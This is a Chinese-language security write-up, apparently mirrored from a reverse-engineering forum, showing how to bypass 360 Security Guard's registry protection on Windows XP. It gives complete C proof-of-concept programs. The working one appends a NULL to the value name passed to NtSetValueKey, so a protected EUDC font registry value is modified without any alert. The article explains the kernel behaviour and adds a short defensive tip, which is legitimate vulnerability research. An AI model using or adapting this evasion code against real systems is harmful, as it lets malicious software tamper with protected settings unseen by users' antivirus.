
# 利用一个 NULL 绕过 360 注册表监控

> 原文：[`www.pediy.com/kssd/pediy12/131691.html`](https://www.pediy.com/kssd/pediy12/131691.html)

## 一.测试环境

本次测试所采用的操作系统为中文版 `Windows XP SP3`（使用 `360` 安全卫士更新了所有补丁），`360` 安全卫士 `7.8.0.1001`（备用木马库 `2011-04-01`），`360` 杀毒软件 `2.0.0.1330`（病毒库日期 `2011-04-01 03:49`），计算机处于联网状态，`360` 安全卫士、`360` 杀毒都“已成功连接至 `360` 云安全中心”。建立了一个名为 `admin` 的管理员用户。

【注意！】本次测试都在管理员下进行。

## 二.测试

### 1.测试 1

```c
#include <windows.h>

void main()
{
  BYTE  RegBuf[0x28] = {0};
  HKEY  hKey;

  if ( RegOpenKey(HKEY_CURRENT_USER,L"EUDC\\936",&hKey) == ERROR_SUCCESS )
  {
    RegSetValueEx(hKey, L"SystemDefaultEUDCFont", 0, REG_BINARY, RegBuf, 0x28);

    RegCloseKey(hKey);
  }
}
```

编译后运行，`360` 木马防火墙提示风险“发现程序正在修改系统关键设置”，默认选择为“阻止本次操作”，点确定后 `HKEY_CURRENT_USER\EUDC\936` 下 `SystemDefaultEUDCFont` 的数据以及类型没有被修改。

### 2.测试 2

考虑到 `RegSetValueEx` 是位于 `Advapi32.dll` 里面的一个函数，不够底层，在 `RegSetValueEx` 的执行过程中可能会存在干扰，于是调用 `ntdll.dll` 里面的 `NtSetValueKey`。

```c
#include <windows.h>

typedef struct _UNICODE_STRING {
  USHORT  Length;
  USHORT  MaximumLength;
  WCHAR   *Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef NTSTATUS ( __stdcall *NtSetValueKey_ ) (
  IN HANDLE      KeyHandle,
  IN PUNICODE_STRING  ValueName,
  IN ULONG      TitleIndex,
  IN ULONG      Type,
  IN PVOID      Data,
  IN ULONG      DataSize
  );

NtSetValueKey_ NtSetValueKey = NULL;

int main()
{
  BYTE  RegBuf[0x28] = {0};
  HKEY  hKey;

  if ( RegOpenKey(HKEY_CURRENT_USER,L"EUDC\\936",&hKey) != ERROR_SUCCESS )
    return FALSE;

  NtSetValueKey    =  (NtSetValueKey_)GetProcAddress(GetModuleHandle(L"ntdll.dll"),"NtSetValueKey");

  if ( NtSetValueKey == NULL )
    return FALSE;

  WCHAR  lpszName[22]    =  L"SystemDefaultEUDCFont";//21 个字符
  UNICODE_STRING    ValueName;
  ValueName.Buffer      =  lpszName;
  ValueName.Length      =  21 * 2;
  ValueName.MaximumLength    =  21 * 2;

  NtSetValueKey( (HANDLE)hKey, &ValueName, NULL,REG_BINARY, (BYTE *)RegBuf, 0x28 );
  RegCloseKey(hKey);
}
```

编译后运行，`360` 木马防火墙仍然提示风险“发现程序正在修改系统关键设置”，默认选择为“阻止本次操作”，点确定后 `HKEY_CURRENT_USER\EUDC\936` 下 `SystemDefaultEUDCFont` 的数据以及类型没有被修改。

【思考】

对于 `UNICODE_STRING` 结构体，`Length` 表明了字符串的长度，`Buffer` 指向的字符串不再以 `NULL` 表示字符串的结束。回忆很久以前刚开始学习 C 语言时，书、老师都在强调：字符串末尾是 `NULL`，碰到 `NULL` 就说明字符串结束了。于是灵光一闪，如果在 `UNICODE_STRING` 里面加个 `NULL` 会怎样？

### 3.测试 3

```c
#include <windows.h>

typedef struct _UNICODE_STRING {
  USHORT  Length;
  USHORT  MaximumLength;
  WCHAR   *Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef NTSTATUS ( __stdcall *NtSetValueKey_ ) (
  IN HANDLE      KeyHandle,
  IN PUNICODE_STRING  ValueName,
  IN ULONG      TitleIndex,
  IN ULONG      Type,
  IN PVOID      Data,
  IN ULONG      DataSize
  );

NtSetValueKey_ NtSetValueKey = NULL;

int main()
{
  BYTE  RegBuf[0x28] = {0};
  HKEY  hKey;

  if ( RegOpenKey(HKEY_CURRENT_USER,L"EUDC\\936",&hKey) != ERROR_SUCCESS )
    return FALSE;

  NtSetValueKey    =  (NtSetValueKey_)GetProcAddress(GetModuleHandle(L"ntdll.dll"),"NtSetValueKey");

  if ( NtSetValueKey == NULL )
    return FALSE;

  WCHAR  lpszName[22]    =  L"SystemDefaultEUDCFont";//21 个字符
  UNICODE_STRING    ValueName;
  ValueName.Buffer      =  lpszName;
  ValueName.Length      =  21 * 2 + 2;//长度+2，指明多了一个 NULL，这是关键之处！
  ValueName.MaximumLength    =  21 * 2 + 2;//长度+2，指明多了一个 NULL

  NtSetValueKey( (HANDLE)hKey, &ValueName, NULL,REG_BINARY, (BYTE *)RegBuf, 0x28 );
  RegCloseKey(hKey);
}
```

上面代码的关键之处在于 `ValueName.Length` 要 `+2`，使得 `UNICODE_STRING` 中包含一个 `NULL`。编译后运行，`360` 无任何提示。运行 `regedit.exe`，可以看到 `HKEY_CURRENT_USER\EUDC\936` 下面的 `SystemDefaultEUDCFont` 数值类型为 `REG_BINARY`，数值数据是一连串的 `0`。

### 4.nt!NtSetValueKey 是怎么处理的？

以 `ntkrnlpa.exe`（`5.1.2600.6055`）为例，在 `0x8061A410` 处开始处理 `UNICODE_STRING.Buffer` 所指向的字符串末尾的 `NULL`，有一个 `NULL` 就将 `Length` 减 `2`，两个就减 `4`，碰到第一个不是 `NULL` 的字符为止。这样在传递到 `nt!CmSetValueKey` 时，`UNICODE_STRING` 最后面就不包括 `NULL` 了，`SystemDefaultEUDCFont+NULL` 变成了 `SystemDefaultEUDCFont`

### 5.防御建议

对比要保护的数值名称时，请无视 `Buffer` 末尾的 `NULL`！

## 三、参考资料

`HKEY_CURRENT_USER\EUDC\936`：

`Nooby` 的 POC：`http://www.debugman.com/discussion/5767/`

英文文档 `http://www.security.nl/files/Bypass_UAC.pdf`

`UNICODE_STRING`：《天书夜读：从汇编语言到 Windows 内核编程》P40

`nt!NtSetValueKey`：`IDA` 反汇编分析或 `WRK`
